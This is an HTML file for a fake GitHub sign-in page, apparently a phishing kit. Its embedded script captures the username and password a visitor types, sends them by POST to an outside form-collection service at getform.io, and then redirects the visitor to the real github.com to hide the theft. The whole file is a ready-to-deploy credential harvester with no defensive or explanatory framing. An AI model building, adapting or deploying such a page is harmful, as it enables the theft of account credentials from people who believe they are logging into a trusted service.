<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f6f8fa;
            padding: 50px;
        }
        .login-container {
            width: 300px;
            margin: auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: white;
            box-shadow: 2px 2px 12px #aaa;
        }
        h2 {
            text-align: center;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #28a745;
            border: none;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #218838;
        }
    </style>
    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Prevent the default form submission
            
            // Create a FormData object
            const formData = new FormData(event.target);
            
            // Send the data using fetch
            fetch('https://getform.io/f/aejeknlb', {
                method: 'POST',
                body: formData
            }).then(response => {
                if (response.ok) {
                    // Redirect to GitHub if data is submitted successfully
                    window.location.href = 'https://github.com';
                } else {
                    // Handle errors if needed
                    console.error('Submission failed.');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</head>
<body>

<div class="login-container">
    <h2>Sign in to GitHub</h2>
    <form onsubmit="handleSubmit(event)">
        <input type="text" name="garbo" placeholder="Username or email address" required>
        <input type="password" name="flag" placeholder="Password" required>
        <input type="submit" value="Sign in">
    </form>
    <p style="text-align: center;">Forgot password?</p>
</div>

</body>
</html>
